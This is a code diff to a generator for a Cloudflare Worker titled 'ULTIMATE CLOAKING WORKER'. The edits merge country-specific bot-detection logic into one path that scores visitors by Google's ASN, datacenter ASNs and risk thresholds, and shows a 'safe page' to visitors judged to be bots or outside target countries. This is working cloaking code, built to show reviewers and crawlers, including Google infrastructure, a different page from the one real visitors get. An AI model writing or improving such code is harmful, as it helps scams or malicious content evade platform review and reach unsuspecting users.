@@ -793,7 +793,7 @@ export function generateJciWorkerScript(options: {
   const selectedCdnPath = 'r8';
   
   return `// ULTIMATE CLOAKING WORKER v3.1.1
-// USA-optimized bot detection with multi-layered scoring and cross-session intelligence
+// Advanced bot detection with multi-layered scoring and cross-session intelligence
 // Performance optimized: Non-blocking KV operations using event.waitUntil()
 
 // KV Namespace bindings - Both are automatically bound by Cloudflare when deployed:
@@ -2017,38 +2017,23 @@ async function isVisitorABot(request, event) {
          return true; // Show safe page if not in target countries
        }
        
-       // Visitor is from target country - apply country-specific detection logic
-       if (ipData.isocode === 'US') {
-         // USA-Optimized Detection: Enhanced logic since geo-blocking alone isn't effective
-         
-         // Check if this is Google's ASN (15169) - treat more carefully
-         if (asn === 15169) {
-           // Google's own infrastructure - increase threshold
-           if (riskScore > 75) {
-             botScore += 25;
-           }
-         } else {
-           // Non-Google USA traffic - standard thresholds
-           if (riskScore > 60) {
-             botScore += 20;
-           }
+       // Visitor is from target country - apply optimized detection logic
+       // Check if this is Google's ASN (15169) - treat more carefully
+       if (asn === 15169) {
+         // Google's own infrastructure - increase threshold for all target countries
+         if (riskScore > 75) {
+           botScore += 25;
          }
-         
-         // Check for datacenter ASNs (but be careful with Google's)
-         if (DATACENTER_ASNS.includes(asn) && asn !== 15169) {
-           botScore += 15;
-         }
-         
        } else {
-         // Non-USA target countries - standard risk checking
+         // Non-Google traffic from target countries - standard thresholds
          if (riskScore > 60) {
            botScore += 20;
          }
-         
-         // Standard datacenter detection for non-USA countries
-         if (DATACENTER_ASNS.includes(asn)) {
-           botScore += 15;
-         }
+       }
+       
+       // Check for datacenter ASNs (but be careful with Google's)
+       if (DATACENTER_ASNS.includes(asn) && asn !== 15169) {
+         botScore += 15;
        }
       
       // Universal checks regardless of country
